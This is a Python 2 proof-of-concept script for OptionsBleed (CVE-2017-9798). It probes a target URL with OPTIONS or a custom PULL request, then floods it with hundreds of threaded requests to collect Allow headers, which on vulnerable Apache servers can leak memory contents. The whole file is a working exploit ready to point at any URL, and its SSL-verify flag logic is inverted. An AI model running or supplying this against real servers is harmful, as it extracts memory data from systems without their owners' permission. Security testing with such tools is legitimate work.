# OptionsBleed (CVE-2017-9798) PoC / Scanner

import requests
import argparse
from threading import Thread
from requests.packages.urllib3.exceptions import InsecureRequestWarning


parser = argparse.ArgumentParser()
parser.add_argument('url', type=str, help='full URL (including http(s)) to be scanned')
parser.add_argument('-c', '--count', type=int, default=1000, help='number of times to scan (default: 1000)')
parser.add_argument('-fc', '--force-custom', action='store_true',
                    help='forces the scan to only attempt using custom verb method (default: try OPTIONS then custom)')
parser.add_argument('-tc', '--thread-count', type=int, default=500, help='max concurrent thread count (default: 500)')
parser.add_argument('-nv', '--no-verify', action='store_false', default=True,
                    help='does not verify ssl connection (may be necessary for self-signed certs)')
parser.add_argument('-ni', '--no-ignore', action='store_true', help='does NOT ignore ssl warnings (default: ignored)')
parser.add_argument('-v', '--verbose', action='store_true', help='print all headers')
parser.add_argument('-e', '--errors', action='store_true', help='prints all errors')
args = parser.parse_args()

if not args.no_ignore:
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def does_it_bleed(url, verify=True):
    header = {'user-agent': 'Mozilla'}
    if not args.force_custom:
        try:
            print '[+] checking OPTIONS method'
            r = requests.options(url, headers=header, verify=verify, timeout=4)
            low_headers = map(lambda x: x.lower(), r.headers.keys())
            if args.verbose:
                print '[*] VERBOSE: \n\t-raw OPTIONS headers: \n\t{0} \n\t-low OPTIONS headers: \n\t{1}'.format(
                    ' '.join(r.headers.keys()), ' '.join(low_headers))
            if 'allow' in low_headers:
                print '[+] allow headers detected in OPTIONS response'
                return 'option'
        except requests.exceptions.ConnectionError:
            print '[!] connection error!'
            pass
        except requests.exceptions.ReadTimeout:
            print '[!] connection timed out!'
            pass
        #TODO: SSL verify exception

    try:
        print '[+] checking custom (PULL) method'
        r2 = requests.request('PULL', url, headers=header, verify=verify, timeout=4)
        low_headers2 = map(lambda x: x.lower(), r2.headers.keys())
        if args.verbose:
            print '[*] VERBOSE: \n\t-raw PULL headers: \n\t{0} \n\t-low PULL headers: \n\t{1}'.format(
                ' '.join(r2.headers.keys()), ' '.join(low_headers2))
        if 'allow' in low_headers2:
            print '[+] allow headers detected in custom (PULL) response'
            return 'pull'
    except requests.exceptions.ConnectionError:
        print '[!] connection error! Are you sure there is a server listening on this port?'
        return False
    except requests.exceptions.ReadTimeout:
        print '[!] connection timed out! Try re-running'
        return False
    #TODO: SSL verify exception
    return False


def bleed(url, method='option', verify=True):
    header = {'user-agent': 'Mozilla'}
    try:
        if method == 'pull':
            r = requests.request('PULL', url, headers=header, verify=verify, timeout=2)
        else:
            r = requests.options(url, headers=header, verify=verify, timeout=2)
    except Exception as e:
        errors.append(e.message)
        return
    results.append(r.headers['Allow'])


def hemorrhage():
    pass


print '    ::OptionsBleed (CVE-2017-9798) Scanner::'
print
print '[+] scanning {} to see if it bleeds!'.format(args.url)
bleed_method = does_it_bleed(args.url)
if bleed_method is False:
    print '[+] allow header NOT detected'
    exit(1)
else:
    print '[+] scanning with {0} method...'.format(bleed_method.upper())

threads = []
results = []
errors = []

for i in xrange(args.count):
    t = Thread(target=bleed, args=(args.url, bleed_method, not args.no_verify))
    threads.append(t)
    t.start()
for _thread in threads:
    _thread.join()
print '[+] {0} responses captured'.format(len(results))
print '[+] unique results: {0}'.format(list(set(results)))
#print '[+] VERBOSE: All results: {}'.format(results)
if args.errors:
    print '[+] {0} errors captured\n\tunique errors: {1}'.format(len(errors), list(set(errors)))
print '[+] scan complete!'
